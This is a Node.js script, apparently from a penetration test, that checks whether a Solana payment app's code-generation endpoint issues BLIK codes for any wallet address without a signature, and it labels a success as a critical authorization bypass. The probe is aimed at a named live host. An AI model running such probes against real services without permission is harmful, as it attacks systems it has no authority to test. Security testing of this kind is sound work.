#!/usr/bin/env node
/**
 * Security Test: AUTHZ-VULN-01
 * Tests if POST /api/codes/generate accepts arbitrary wallet addresses without signature verification.
 */

const https = require('https');

async function testAuthzVuln01() {
  console.log('='.repeat(70));
  console.log('SECURITY TEST: AUTHZ-VULN-01');
  console.log('Testing: Authorization Bypass in Code Generation');
  console.log('='.repeat(70));
  console.log();

  // Test configuration
  const targetUrl = 'https://solana-blik.vercel.app/api/codes/generate';
  const testWallet = '11111111111111111111111111111111'; // Arbitrary wallet address

  console.log(`Target URL: ${targetUrl}`);
  console.log(`Test Wallet: ${testWallet}`);
  console.log(`Method: POST`);
  console.log();

  const payload = {
    walletPubkey: testWallet
  };

  const payloadStr = JSON.stringify(payload);

  console.log('Request Headers:');
  console.log('  Content-Type: application/json');
  console.log();
  console.log('Request Body:');
  console.log(JSON.stringify(payload, null, 2));
  console.log();
  console.log('-'.repeat(70));
  console.log('SENDING REQUEST...');
  console.log('-'.repeat(70));
  console.log();

  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'solana-blik.vercel.app',
      port: 443,
      path: '/api/codes/generate',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payloadStr)
      }
    };

    const req = https.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        console.log(`Status Code: ${res.statusCode}`);
        console.log();
        console.log('Response Headers:');
        Object.entries(res.headers).forEach(([key, value]) => {
          console.log(`  ${key}: ${value}`);
        });
        console.log();
        console.log('Response Body:');

        let responseData;
        try {
          responseData = JSON.parse(data);
          console.log(JSON.stringify(responseData, null, 2));
        } catch (e) {
          console.log(data);
        }
        console.log();

        console.log('-'.repeat(70));
        console.log('VULNERABILITY ASSESSMENT');
        console.log('-'.repeat(70));
        console.log();

        // Analyze the response
        if (res.statusCode === 200) {
          try {
            if (!responseData) {
              responseData = JSON.parse(data);
            }

            // Check if we got a code back
            if (responseData.code && responseData.expiresIn !== undefined) {
              const code = responseData.code;
              const expiresIn = responseData.expiresIn;

              // Verify it's a 6-digit code
              if (typeof code === 'string' && code.length === 6 && /^\d{6}$/.test(code)) {
                console.log('🚨 VULNERABILITY CONFIRMED: AUTHZ-VULN-01');
                console.log();
                console.log('Finding:');
                console.log('  The API generated a BLIK code for an arbitrary wallet address');
                console.log('  without requiring signature verification or proof of ownership.');
                console.log();
                console.log('Evidence:');
                console.log(`  - Generated Code: ${code}`);
                console.log(`  - Expires In: ${expiresIn} seconds`);
                console.log(`  - Wallet Address: ${testWallet}`);
                console.log();
                console.log('Impact:');
                console.log('  An attacker can generate BLIK codes for ANY wallet address,');
                console.log('  potentially linking victims\' wallets to attacker-controlled');
                console.log('  phone numbers without their knowledge or consent.');
                console.log();
                console.log('Severity: CRITICAL');
                resolve(true);
              } else {
                console.log('⚠️  Unexpected Response Format');
                console.log(`  Received code: ${code}`);
                console.log('  Expected: 6-digit numeric code');
                resolve(false);
              }
            } else {
              console.log('⚠️  Unexpected Response Structure');
              console.log(`  Missing expected fields: 'code' and/or 'expiresIn'`);
              console.log(`  Received: ${Object.keys(responseData).join(', ')}`);
              resolve(false);
            }
          } catch (e) {
            console.log('⚠️  Response is not valid JSON');
            console.log(`  Response text: ${data}`);
            resolve(false);
          }
        } else if (res.statusCode === 400) {
          console.log('✅ VULNERABILITY NOT PRESENT (Expected Behavior)');
          console.log();
          console.log('The API rejected the request with a 400 Bad Request status.');
          console.log('This suggests proper input validation or authorization checks.');
          try {
            if (!responseData) {
              responseData = JSON.parse(data);
            }
            console.log(`Error message: ${JSON.stringify(responseData)}`);
          } catch (e) {
            // Ignore
          }
          resolve(false);
        } else if (res.statusCode === 401 || res.statusCode === 403) {
          console.log('✅ VULNERABILITY NOT PRESENT (Expected Behavior)');
          console.log();
          console.log(`The API rejected the request with a ${res.statusCode} status.`);
          console.log('This indicates proper authorization checks are in place.');
          try {
            if (!responseData) {
              responseData = JSON.parse(data);
            }
            console.log(`Error message: ${JSON.stringify(responseData)}`);
          } catch (e) {
            // Ignore
          }
          resolve(false);
        } else {
          console.log(`⚠️  Unexpected Status Code: ${res.statusCode}`);
          console.log('Further investigation required.');
          resolve(false);
        }
        console.log();
      });
    });

    req.on('error', (e) => {
      console.log('❌ ERROR: Request failed');
      console.log(`Error: ${e.message}`);
      console.log();
      reject(e);
    });

    req.on('timeout', () => {
      console.log('❌ ERROR: Request timeout');
      req.destroy();
      reject(new Error('Request timeout'));
    });

    req.setTimeout(10000);
    req.write(payloadStr);
    req.end();
  });
}

// Execute the test
testAuthzVuln01()
  .then(() => {
    process.exit(0);
  })
  .catch((error) => {
    console.error('Test execution failed:', error);
    process.exit(1);
  });
